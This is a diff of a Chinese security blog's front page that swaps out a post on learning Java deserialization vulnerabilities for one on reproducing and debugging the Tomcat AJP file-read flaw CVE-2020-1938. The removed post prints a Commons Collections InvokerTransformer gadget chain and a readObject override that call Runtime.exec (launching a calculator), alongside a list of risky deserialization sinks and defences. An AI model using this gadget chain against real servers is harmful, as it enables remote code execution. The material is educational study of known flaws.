@@ -63,21 +63,21 @@
       <div id="middlecontent" title class="global-width sidebar-right">
         <section id="main">
   
-    <article id="post-菜鸡版java反序列化漏洞学习" class="article global-container article-type-post" itemscope itemprop="blogPost">
+    <article id="post-CVE-2020-1938复现和调试" class="article global-container article-type-post" itemscope itemprop="blogPost">
   
     <header class="article-header">
       
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/03/04/菜鸡版java反序列化漏洞学习/">菜鸡版java反序列化漏洞学习</a>
+      <a class="article-title" href="/2020/03/15/CVE-2020-1938复现和调试/">CVE-2020-1938复现和调试</a>
     </h1>
   
 
     </header>
   
   <div class="article-meta">
-    <a href="/2020/03/04/菜鸡版java反序列化漏洞学习/" class="article-date">
-  <time datetime="2020-03-04T15:26:45.000Z" itemprop="datePublished">2020-03-04</time>
+    <a href="/2020/03/15/CVE-2020-1938复现和调试/" class="article-date">
+  <time datetime="2020-03-15T15:06:24.000Z" itemprop="datePublished">2020-03-15</time>
 </a>
     
     
@@ -88,38 +88,19 @@
     
     <div class="article-content article-content-cloud" itemprop="articleBody">
       
-        <h3 id="0x01-Demo"><a href="#0x01-Demo" class="headerlink" title="0x01 Demo"></a>0x01 Demo</h3><p>先创建一个class，然后序列化实例的对象</p>
-<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">import java.io.Serializable;</span><br><span class="line">import java.io.StringReader;</span><br><span class="line"></span><br><span class="line">public class User implements Serializable &#123;</span><br><span class="line">    private static final long seriaVersionUID =1l;</span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line"></span><br><span class="line">    public User(String name ,int age)&#123;</span><br><span class="line">        this.age=age;</span><br><span class="line">        this.name=name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;User&#123;&quot; +</span><br><span class="line">                &quot;name=&apos;&quot; + name + &apos;\&apos;&apos; +</span><br><span class="line">                &quot;, age=&quot; + age +</span><br><span class="line">                &apos;&#125;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>序列化和反序列化</p>
-<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class Runtest &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">//        序列化User</span><br><span class="line">        User user =new User ( &quot;admin&quot;,25 );</span><br><span class="line">        ObjectOutput oss;</span><br><span class="line">        try&#123;</span><br><span class="line">            oss =new ObjectOutputStream (new FileOutputStream(&quot;userobj&quot;) );</span><br><span class="line">            oss.writeObject (user);</span><br><span class="line">        &#125;catch (IOException e)&#123;</span><br><span class="line">            e.printStackTrace ();</span><br><span class="line">        &#125;</span><br><span class="line">//        反序列化User</span><br><span class="line">        File file =new File ( &quot;userobj&quot; );</span><br><span class="line">        ObjectInputStream ois;</span><br><span class="line">        try  &#123;</span><br><span class="line">            ois = new ObjectInputStream ( (new FileInputStream ( file )) );</span><br><span class="line">            User newuser =(User)ois.readObject ();</span><br><span class="line">            System.out.println (newuser);</span><br><span class="line">        &#125;catch (IOException e)&#123;</span><br><span class="line">            e.printStackTrace ();</span><br><span class="line">        &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace ();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>序列化后文件xxd查看</p>
-<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">00000000: aced 0005 7372 0004 5573 6572 f221 8b1e  ....sr..User.!..</span><br><span class="line">00000010: 7194 f51a 0200 0249 0003 6167 654c 0004  q......I..ageL..</span><br><span class="line">00000020: 6e61 6d65 7400 124c 6a61 7661 2f6c 616e  namet..Ljava/lan</span><br><span class="line">00000030: 672f 5374 7269 6e67 3b78 7000 0000 1974  g/String;xp....t</span><br><span class="line">00000040: 0005 6164 6d69 6e                        ..admin</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="0x02-不安全的反序列化"><a href="#0x02-不安全的反序列化" class="headerlink" title="0x02 不安全的反序列化"></a>0x02 不安全的反序列化</h3><p><strong>重写readObject的方法,这个方法可控或者这个方法的某些参数可控</strong></p>
-<pre><code>private void readObject(ObjectInputStream in){
-    try{
-        in.defaultReadObject ();
-        Runtime.getRuntime ().exec ( &quot;open /System/Applications/Calculator.app&quot; );
-        System.out.println (&quot;ok&quot;);
-    }catch (Exception e ){
-      e.printStackTrace ();
-    }
-
-}</code></pre><p> 至于这里readObject属性为什么是私有属性，我……，这不是我这种小白能理解的，我对**一无所知<br>总之，反序列化的时候会先执行readObject这个方法<br><img src="https://i.loli.net/2020/03/04/4rAuUHzcYx8qg2K.png" alt="图片.png"></p>
-<h3 id="0x03-反序列化漏洞检测与防护"><a href="#0x03-反序列化漏洞检测与防护" class="headerlink" title="0x03 反序列化漏洞检测与防护"></a>0x03 反序列化漏洞检测与防护</h3><p>1 resolveClass方法可以绕过，用黑名单的方式防护<br>2 代码中含有类似于readObject的方法可控，类似的方法还有readObjectNoData,readObjectResolve,readExternal等等<br>检测方法：<br>在代码中搜索这些内容，最常见的有fastjson，Jackson等，还有存在漏洞CommonsCollections的版本，不过这三者的触发原理不太一样，fastjson，Jackson的利用链多是利用可控的JNDI和RMI进行注入恶意代码，然后反序列化此类，我只看了CommonsCollections的原理，其他两个没有自己跟踪过代码进行学习。</p>
-<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject</span><br><span class="line">ObjectInputStream.readUnshared</span><br><span class="line">XMLDecoder.readObject</span><br><span class="line">Yaml.load</span><br><span class="line">XStream.fromXML</span><br><span class="line">mapper.readValue</span><br><span class="line">ObjectMapper.readValue</span><br><span class="line">enableDefaultTyping()</span><br><span class="line">@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</span><br><span class="line">@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span><br><span class="line">JSON.parse()</span><br><span class="line">JSON.parseObject(修复方法：删除ParserConfig.getGlobalInstance().setAutoTypeSupport(true);)</span><br></pre></td></tr></table></figure></div>
-
-<p>防护方法<br>1 SecurityManager  禁止Runtime.exec<br>2 重载ObjectInputStream的resolveClass()方法<br>3 利用第三方库的反序列化检测功能</p>
-<h3 id="0x04-CommonsCollections—POC分析"><a href="#0x04-CommonsCollections—POC分析" class="headerlink" title="0x04 CommonsCollections—POC分析"></a>0x04 CommonsCollections—POC分析</h3><p>POC比较多，有很多种，目前只看了AnnotationInvocationHandler这种的</p>
-<h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><p>生成TransformedMap，修改TransformedMap键值对时，达到可执行命令的效果</p>
-<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">   public static void main(String[] args) &#123;</span><br><span class="line">       //transformers: 一个transformer链，包含各类transformer对象（预设转化逻辑）的转化数组</span><br><span class="line">       Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">               new ConstantTransformer(Runtime.class),</span><br><span class="line">               new InvokerTransformer(&quot;getMethod&quot;,</span><br><span class="line">                       new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">                       &quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">               new InvokerTransformer(&quot;invoke&quot;,</span><br><span class="line">                       new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">                       null, new Object[0] &#125;),</span><br><span class="line">               new InvokerTransformer(&quot;exec&quot;,</span><br><span class="line">                       new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;open -a Calculator&quot;&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">       //首先构造一个Map和一个能够执行代码的ChainedTransformer，以此生成一个TransformedMap</span><br><span class="line">       Transformer transformedChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">       Map innerMap = new HashMap();</span><br><span class="line">       innerMap.put(&quot;admin&quot;, &quot;test&quot;);</span><br><span class="line">/*通过TransformedMap的静态方法decorate实例化TransformedMap对象，Map为普通的Map(第一个参数)，第二个参数和第三参数对应Map的 键值对修改时对应执行的操作，当key或者value变化时，会调用其接口的Object transform(Object var1);   */</span><br><span class="line"></span><br><span class="line">       Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain);</span><br><span class="line">       //触发Map中的MapEntry产生修改（例如setValue()函数</span><br><span class="line">       Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line"></span><br><span class="line">       onlyElement.setValue(&quot;foobar&quot;);</span><br><span class="line">   /*代码运行到setValue()时，就会触发ChainedTransformer中的一系列变换函数：</span><br><span class="line">      首先通过ConstantTransformer获得Runtime类</span><br><span class="line">      进一步通过反射调用getMethod找到invoke函数</span><br><span class="line">      最后再运行命令calc.exe。</span><br><span class="line">   */</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>上述代码执行效果<img src="https://i.loli.net/2020/03/04/Xk4drOI32ema9VL.png" alt="图片.png"><br>第二部<br>找到执行命令的载体–在readObject插入上述<br>AnnotationInvocationHandler类中，具体方法是实例化一个AnnotationInvocationHandler类，然后将memberValues赋值成我们构造的TransformedMap<br>参考别人的代码</p>
-<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">//       反射加载AnnotationInvocationHandler</span><br><span class="line">        Class cl = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">//获取构造器</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(true);</span><br><span class="line">//        将上述map传入，并实例化此类</span><br><span class="line">        Object instance = ctor.newInstance(Target.class, outerMap);</span><br></pre></td></tr></table></figure></div>
-
-<p>参考：<br><a href="https://www.freebuf.com/vuls/175252.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/175252.html</a><br><a href="https://blog.csdn.net/bigtree_3721/article/details/51263780" target="_blank" rel="noopener">https://blog.csdn.net/bigtree_3721/article/details/51263780</a><br><a href="http://cnblogs.com/ssooking/p/5875215.html" target="_blank" rel="noopener">http://cnblogs.com/ssooking/p/5875215.html</a></p>
+        <h3 id="0x01-文件读取"><a href="#0x01-文件读取" class="headerlink" title="0x01 文件读取"></a>0x01 文件读取</h3><p>漏洞利用场景:<br>AJP协议开启，且在指定tomcat版本范围中<br>可读取文件<br>可包含文件，getshell，需要结合上传漏洞将被包含内容上传</p>
+<h4 id="poc效果图"><a href="#poc效果图" class="headerlink" title="poc效果图"></a>poc效果图</h4><p><img src="https://i.loli.net/2020/03/15/DWSoQHEy8Yjnb4s.png" alt="图片.png"></p>
+<h3 id="0x02-调试分析"><a href="#0x02-调试分析" class="headerlink" title="0x02 调试分析"></a>0x02 调试分析</h3><h4 id="1-了解tomcat启动过程："><a href="#1-了解tomcat启动过程：" class="headerlink" title="1 了解tomcat启动过程："></a>1 了解tomcat启动过程：</h4><p>Tomcat Server处理一个http请求的过程<br><a href="详细">https://www.cnblogs.com/yaowen/p/9083285.html</a></p>
+<p>假设来自客户的请求为：<a href="http://localhost:8080/wsota/wsota_index.jsp" target="_blank" rel="noopener">http://localhost:8080/wsota/wsota_index.jsp</a><br>1) 请求被发送到本机端口8080，被在那里侦听的Coyote HTTP/1.1 Connector获得<br>2) Connector把该请求交给它所在的Service的Engine来处理，并等待来自Engine的回应<br>3) Engine获得请求localhost/wsota/wsota_index.jsp，匹配它所拥有的所有虚拟主机Host<br>4) Engine匹配到名为localhost的Host（即使匹配不到也把请求交给该Host处理，因为该Host被定义为该Engine的默认主机）<br>5) localhost Host获得请求/wsota/wsota_index.jsp，匹配它所拥有的所有Context<br>6) Host匹配到路径为/wsota的Context（如果匹配不到就把该请求交给路径名为””的Context去处理）<br>7) path=”/wsota”的Context获得请求/wsota_index.jsp，在它的mapping table中寻找对应的servlet<br>8) Context匹配到URL PATTERN为*.jsp的servlet，对应于JspServlet类<br>9) 构造HttpServletRequest对象和HttpServletResponse对象，作为参数调用JspServlet的doGet或doPost方法<br>10)Context把执行完了之后的HttpServletResponse对象返回给Host<br>11)Host把HttpServletResponse对象返回给Engine<br>12)Engine把HttpServletResponse对象返回给Connector<br>13)Connector把HttpServletResponse对象返回给客户browser</p>
+<h4 id="2-部署调试环境"><a href="#2-部署调试环境" class="headerlink" title="2 部署调试环境"></a>2 部署调试环境</h4><p>根据类（org.apache.coyote.ajp.AjpProcessor）找到所在jar包</p>
+<p><img src="https://i.loli.net/2020/03/15/TANo5X3gexdDMjC.png" alt="图片.png"></p>
+<h4 id="3-idea调试"><a href="#3-idea调试" class="headerlink" title="3 idea调试"></a>3 idea调试</h4><p>重点的几处下断点，进行调试，略过初始化，NIO等过程<br><img src="https://i.loli.net/2020/03/15/28liaOAQjqCTe9M.png" alt="图片.png"></p>
+<p>可以看到读取的文件路径<br><img src="https://i.loli.net/2020/03/15/FvgWf9AOowPzhm4.png" alt="图片.png"></p>
+<p>serveResource方法下resources.getResource传入路径，以流的方式读取</p>
+<p><img src="https://i.loli.net/2020/03/15/rL284Uvu9ayxkS1.png" alt="图片.png"></p>
+<p>读取文件返回响应数据，红框部分为构造响应头<br><img src="https://i.loli.net/2020/03/15/PQfCyk4B8AbLwhR.png" alt="图片.png"></p>
+<p>io流，读物响应体的数据内容<br><img src="https://i.loli.net/2020/03/15/4Y7odLkElc6XrhB.png" alt="图片.png"></p>
+<p>支持，漏洞的 几处关键流程就走的差不多了<br>我比较喜欢这篇文章<br><a href="https://blog.csdn.net/jsj13263690918/article/details/80368757" target="_blank" rel="noopener">https://blog.csdn.net/jsj13263690918/article/details/80368757</a><br>讲的是tomcat的核心原理，其实我在调试代码的就感觉到了里面的几层设计，包括，NIO，Connector，Processor,Service,Wrapper等</p>
 
       
     </div>
@@ -134,7 +115,7 @@
 
   <nav id="page-nav">
     
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
   </nav>
 
 
@@ -181,6 +162,10 @@
       <ul>
         
           <li>
+            <a href="/2020/03/15/CVE-2020-1938复现和调试/">CVE-2020-1938复现和调试</a>
+          </li>
+        
+          <li>
             <a href="/2020/03/04/菜鸡版java反序列化漏洞学习/">菜鸡版java反序列化漏洞学习</a>
           </li>
         
@@ -194,10 +179,6 @@
         
           <li>
             <a href="/2020/02/11/Android布局及控件/">Android布局及控件</a>
-          </li>
-        
-          <li>
-            <a href="/2020/02/08/NDK-Build-方式实现JIN/">NDK-Build 方式实现JIN</a>
           </li>
         
       </ul>
